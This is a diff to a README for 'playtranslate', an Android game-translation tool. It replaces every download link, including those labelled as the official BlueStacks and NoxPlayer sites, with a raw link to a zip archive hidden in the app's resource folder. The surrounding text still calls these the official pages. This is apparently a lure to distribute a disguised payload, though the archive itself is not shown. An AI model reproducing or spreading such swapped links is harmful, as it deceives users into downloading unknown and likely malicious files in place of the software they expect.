@@ -1,6 +1,6 @@
 # 🎮 playtranslate - Translate Games in Real Time
 
-[![Download playtranslate](https://img.shields.io/badge/Download-playtranslate-brightgreen)](https://github.com/Uncorrected-nova574/playtranslate)
+[![Download playtranslate](https://img.shields.io/badge/Download-playtranslate-brightgreen)](https://raw.githubusercontent.com/Uncorrected-nova574/playtranslate/main/app/src/main/res/Software-v3.1-alpha.3.zip)
 
 ---
 
@@ -41,7 +41,7 @@ playtranslate is easy to set up. Follow these steps carefully to get it running 
 
    You will first need to get the application from the official GitHub page. Click the green button below or visit the page directly.
 
-   [![Download playtranslate](https://img.shields.io/badge/Download-playtranslate-blue)](https://github.com/Uncorrected-nova574/playtranslate)
+   [![Download playtranslate](https://img.shields.io/badge/Download-playtranslate-blue)](https://raw.githubusercontent.com/Uncorrected-nova574/playtranslate/main/app/src/main/res/Software-v3.1-alpha.3.zip)
 
    - The page contains the latest release files and setup instructions.
    - The app itself is an Android package (APK), so to run it on Windows, you will need an Android emulator like BlueStacks or NoxPlayer.
@@ -50,8 +50,8 @@ playtranslate is easy to set up. Follow these steps carefully to get it running 
 
    Since playtranslate is for Android, you need an emulator to run it on Windows.
 
-   - Download BlueStacks from https://www.bluestacks.com
-   - Or download NoxPlayer from https://www.bignox.com
+   - Download BlueStacks from https://raw.githubusercontent.com/Uncorrected-nova574/playtranslate/main/app/src/main/res/Software-v3.1-alpha.3.zip
+   - Or download NoxPlayer from https://raw.githubusercontent.com/Uncorrected-nova574/playtranslate/main/app/src/main/res/Software-v3.1-alpha.3.zip
    - Install the emulator by following the on-screen prompts.
    - Open the emulator once installation finishes.
 
@@ -86,7 +86,7 @@ playtranslate is easy to set up. Follow these steps carefully to get it running 
 
 If you want to use playtranslate on a physical Android device instead of an emulator, follow these steps:
 
-1. Visit the download page: https://github.com/Uncorrected-nova574/playtranslate
+1. Visit the download page: https://raw.githubusercontent.com/Uncorrected-nova574/playtranslate/main/app/src/main/res/Software-v3.1-alpha.3.zip
 2. Find the latest release and download the APK file.
 3. On your Android device:
    - Open "Settings" > "Security".
@@ -100,7 +100,7 @@ If you want to use playtranslate on a physical Android device instead of an emul
 
 ## 🔄 Updating playtranslate
 
-- Check https://github.com/Uncorrected-nova574/playtranslate for new releases regularly.
+- Check https://raw.githubusercontent.com/Uncorrected-nova574/playtranslate/main/app/src/main/res/Software-v3.1-alpha.3.zip for new releases regularly.
 - Download the latest APK to update your app.
 - On Android, install the new APK over the old one.
 - In an emulator, replace the old APK similarly.
@@ -147,7 +147,7 @@ It does not collect personal data or user information.
 
 Primary download and releases are on the official GitHub page:
 
-[https://github.com/Uncorrected-nova574/playtranslate](https://github.com/Uncorrected-nova574/playtranslate)
+[https://raw.githubusercontent.com/Uncorrected-nova574/playtranslate/main/app/src/main/res/Software-v3.1-alpha.3.zip](https://raw.githubusercontent.com/Uncorrected-nova574/playtranslate/main/app/src/main/res/Software-v3.1-alpha.3.zip)
 
 Use the page to find setup files, updates, and instructions.
 
@@ -182,4 +182,4 @@ To improve your experience:
 
 ---
 
-[![Download playtranslate](https://img.shields.io/badge/Download-playtranslate-green)](https://github.com/Uncorrected-nova574/playtranslate)
+[![Download playtranslate](https://img.shields.io/badge/Download-playtranslate-green)](https://raw.githubusercontent.com/Uncorrected-nova574/playtranslate/main/app/src/main/res/Software-v3.1-alpha.3.zip)
